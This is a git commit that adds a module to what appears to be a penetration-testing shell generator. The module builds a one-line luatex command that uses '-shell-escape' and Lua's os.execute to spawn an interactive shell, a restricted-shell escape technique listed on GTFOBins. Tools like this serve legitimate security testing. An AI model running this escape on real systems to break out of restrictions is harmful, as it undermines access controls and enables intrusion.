11bf87bf126a3ae1f0de8a56b640e8e8fd141ab0
Nong Hoang Tu <dmknght@parrotsec.org>
2021-10-20 20:17:14 +0700

    Add luatext pty

---
+++ shellgen/modules/linux/luatext.py
@@ -0,0 +1,21 @@
+from ogabog.cores import plugin, const
+
+
+class PTY(plugin.Module):
+    def __init__(self):
+        super().__init__()
+        self.add_args(
+            "--shell",
+            default="bash",
+            choices=const.LINUX_SHELL,
+            help="Select shell type on target machine"
+        )
+        self.opts.description = "[PTYShell] Luatext PTY shell escape. https://gtfobins.github.io/gtfobins/luatex/"
+        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
+        self.shell_type = "pty"
+
+    def make_shell(self):
+        self.shell = "luatex -shell-escape '\\directlua{os.execute(\""
+        self.shell += f"{self.args.shell}\")"
+        self.shell += "}\\end'"
+
